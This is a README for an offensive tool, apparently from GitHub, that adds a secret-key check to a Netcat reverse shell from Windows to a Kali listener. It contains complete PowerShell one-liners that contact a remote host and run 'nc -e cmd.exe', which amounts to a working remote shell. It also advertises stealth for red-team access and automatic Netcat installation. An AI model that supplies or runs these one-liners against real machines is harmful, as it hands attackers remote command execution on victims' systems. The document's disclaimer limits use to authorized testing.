# 🔐 Netcat Authenticator Tool

A lightweight Python-based tool that adds an **authentication layer over Netcat** before granting reverse shell access — all over a single port. This utility is built for **red teamers, penetration testers, and security researchers** who need secure shell access from Windows to Kali/Linux machines.

---

## ⚙️ Features

- ✅ Authentication before shell access using Base64 secrets  
- ✅ Single-port operation: both authentication and shell happen on the same port  
- ✅ PowerShell reverse shell command generator for Windows clients  
- ✅ Automatic Netcat installation on Windows if it's missing  
- ✅ Clean and simple CLI interface  
- ✅ Supports exit mechanism and proper session handling  

---

## 🧠 Use Case

In typical Netcat reverse shells, anyone connecting to a listener gets instant access — **this tool prevents that by requiring a secret key** to authenticate the client. Only after the correct key is sent will the listener allow the shell to connect.

This can be helpful for:

- Red team operations where stealth and access control are critical  
- Teaching secure shell handling with minimal setup  
- Preventing unintended access on open listeners during internal testing  

---

## 📦 Requirements

- Python 3.x  
- Netcat (`nc`) must be available on the Kali system  
- Admin privileges on Windows (for installation)
- Standard Python libraries used:
    argparse, base64, socket, signal, sys, subprocess, os, shutil

  
---

## 🚀 Installation

Clone the repo:

```bash
git clone https://github.com/yourusername/netcat-authenticator.git
cd netcat-authenticator
```

---

## 🛠️ Usage

### 1. Generate PowerShell One-liner for Client (Windows)

This command generates a PowerShell one-liner that can be run on a Windows machine to authenticate and get shell access:

```bash
python3 Nectcat_Authenticator.py --mode generate --secret YOUR_SECRET --ip YOUR_KALI_IP --port 4444
```

📌 Output Example:

```powershell
powershell -command "$ip='192.168.1.10';$port=4444;$b='c2VjcmV0MTIz';$resp=echo $b|nc $ip $port;if($resp -match 'OK'){nc $ip $port -e cmd.exe}else{exit}"
```

---

### 2. Start Listener on Kali (Linux)

This command starts the secure listener on Kali Linux:

```bash
python3 Nectcat_Authenticator.py --mode listen --secret YOUR_SECRET --port 4444
```

🖥️ The tool will:

- Wait for incoming connections  
- Verify the Base64-encoded secret  
- Only if correct, start the actual shell listener on the same port  

---

## 🔐 Example Workflow

**Step 1 (on Kali):**
```bash
python3 Nectcat_Authenticator.py --mode listen --secret test123 --port 4444
```

**Step 2 (on Windows):**
Run the generated one-liner in PowerShell:

```powershell
powershell -command "$ip='192.168.1.10';$port=4444;$b='dGVzdDEyMw==';$resp=echo $b|nc $ip $port;if($resp -match 'OK'){nc $ip $port -e cmd.exe}else{exit}"
```

---

## 🧩 How It Works

- Listener waits on a single port for authentication  
- Client sends a Base64-encoded secret  
- If it matches, the server sends an OK response  
- Client then connects again on the same port to spawn `cmd.exe`  
- If authentication fails, connection is closed immediately  

---

## ❗ Disclaimer

⚠️ This tool is intended strictly for educational and authorized security testing purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.
